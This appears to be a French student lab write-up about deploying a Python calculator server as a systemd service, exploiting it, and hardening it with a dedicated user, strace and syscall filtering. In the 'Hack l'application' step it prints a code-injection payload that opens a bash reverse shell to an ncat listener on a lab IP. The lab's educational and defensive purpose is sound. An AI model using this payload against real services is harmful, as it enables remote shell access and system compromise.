🌞 **Téléchargez l'app Python dans votre VM**

```
[antmrlt@vbox ~]$ sudo curl -o /opt/calc.py https://gitlab.com/it4lik/b3e-linux-2024/-/raw/main/tp/2/calc.py?inline=false
```

🌞 **Lancer l'application dans votre VM**

```
PS C:\Users\antoi> ncat 192.168.254.4 13337

Hello3+3
6
```

## 2. Création de service

🌞 **Créer un service `calculatrice.service`**

```ini
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 **Indiquer à systemd que vous avez modifié les services**

```bash
sudo systemctl daemon-reload
```

🌞 **Vérifier que ce nouveau service est bien reconnu***

```
[antmrlt@vbox ~]$ systemctl status calculatrice
○ calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: inactive (dead)
```

🌞 **Vous devez pouvoir utiliser l'application normalement :**

- démarrage de l'application avec `sudo systemctl start calculatrice`
- vous pouvez vous connecter depuis votre PC
- l'affichage de l'application est disponible dans les logs : `journalctl -xe -u calculatrice`

🌞 **Hack l'application**

Attaquant
```
PS C:\Users\antoi> ncat -lvp 4242
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 192.168.254.4:50486.
```

Vicime

```
PS C:\Users\antoi> ncat 192.168.254.4 13337

Hello __import__('os').system('bash -i >& /dev/tcp/192.168.254.1/4242 0>&1')
```

🌞 **Prouvez que le service s'exécute actuellement en `root`**

```
[antmrlt@vbox ~]$ ps -aux | grep calc.py
root        1682  0.0  0.4  10892  8576 ?        Ss   15:59   0:00 /usr/bin/python3 /opt/calc.py
```

🌞 **Créer l'utilisateur `calculatrice`**

```
sudo useradd -s /sbin/nologin -M calculatrice
```

🌞 **Adaptez les permissions**

```
[antmrlt@vbox ~]$ sudo chown calculatrice:calculatrice /opt/calc.py
[antmrlt@vbox ~]$ ls -l /opt/calc.py
-rw-r--r--. 1 calculatrice calculatrice 780 Feb 19 15:14 /opt/calc.py
```

🌞 **Modifier le `.service`**

```
[antmrlt@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
User=calculatrice
[antmrlt@vbox ~]$ sudo systemctl daemon-reload
[antmrlt@vbox ~]$ sudo systemctl start calculatrice
```

🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**

```
[antmrlt@vbox ~]$ ps -aux | grep calc.py
calcula+    1906  0.1  0.4  10828  8192 ?        Ss   16:17   0:00 /usr/bin/python3 /opt/calc.py
```

🌞 **Tracez l'exécution de l'application : normal**

```
[antmrlt@vbox ~]$ strace -c python3 /opt/calc.py
strace: Process 1932 detached
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0        66           read
  0.00    0.000000           0        52           close
  0.00    0.000000           0        79           fstat
  0.00    0.000000           0        61         3 lseek
  0.00    0.000000           0        48           mmap
  0.00    0.000000           0        10           mprotect
  0.00    0.000000           0         1           munmap
  0.00    0.000000           0        11           brk
  0.00    0.000000           0        65           rt_sigaction
  0.00    0.000000           0        32        26 ioctl
  0.00    0.000000           0         4           pread64
  0.00    0.000000           0         1         1 access
  0.00    0.000000           0         3           dup
  0.00    0.000000           0         1           socket
  0.00    0.000000           0         1           bind
  0.00    0.000000           0         1           listen
  0.00    0.000000           0         1           getsockname
  0.00    0.000000           0         1           setsockopt
  0.00    0.000000           0         1           execve
  0.00    0.000000           0         3           fcntl
  0.00    0.000000           0         5         4 readlink
  0.00    0.000000           0         1           sysinfo
  0.00    0.000000           0         1           getuid
  0.00    0.000000           0         1           getgid
  0.00    0.000000           0         1           geteuid
  0.00    0.000000           0         1           getegid
  0.00    0.000000           0         2         1 arch_prctl
  0.00    0.000000           0         1           futex
  0.00    0.000000           0        18           getdents64
  0.00    0.000000           0         1           set_tid_address
  0.00    0.000000           0        53         5 openat
  0.00    0.000000           0       151        20 newfstatat
  0.00    0.000000           0         1           set_robust_list
  0.00    0.000000           0         1           accept4
  0.00    0.000000           0         1           epoll_create1
  0.00    0.000000           0         1           prlimit64
  0.00    0.000000           0         2           getrandom
  0.00    0.000000           0         1           rseq
------ ----------- ----------- --------- --------- ----------------
100.00    0.000000           0       685        60 total
```

🌞 **Tracez l'exécution de l'application : hack**

- idem, mais pendant que vous exploitez la vulnérabilité
- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?

🌞 **Adaptez le `.service`**

- ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`
- vérifiez que l'exploitation est devenue plus compliquée

